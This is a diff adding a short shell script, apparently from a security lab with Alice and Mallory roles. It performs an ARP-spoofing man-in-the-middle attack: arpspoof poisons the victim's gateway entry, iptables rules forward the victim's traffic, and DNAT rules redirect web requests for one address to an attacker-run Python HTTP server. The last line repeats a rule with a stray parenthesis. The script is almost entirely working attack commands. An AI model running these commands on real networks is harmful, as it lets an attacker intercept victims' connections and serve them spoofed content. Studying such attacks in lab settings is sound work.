@@ -1,0 +1,21 @@
+# arp spoofing to steal alices LAN connection from the router
+arpspoof -i eth0 -t 10.0.0.2 10.0.0.1
+
+# clear ip tables
+# if needed, create index.html
+# forward packets as legitimate gateway
+
+iptables -F
+iptables -F -t nat
+iptables -F -t mangle
+iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+iptables -A FORWARD -i eth1 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
+
+# start server (on mallory terminal)
+python2.7 -m SimpleHTTPServer 8080
+
+# become malicious on mallorys terminal
+iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080
+
+iptables -t nat -A PREROUTING -p tcp -i eth0 -d 142.1.97.172 --dport 80 -j DNAT --to-destination 10.0.0.3:8080)
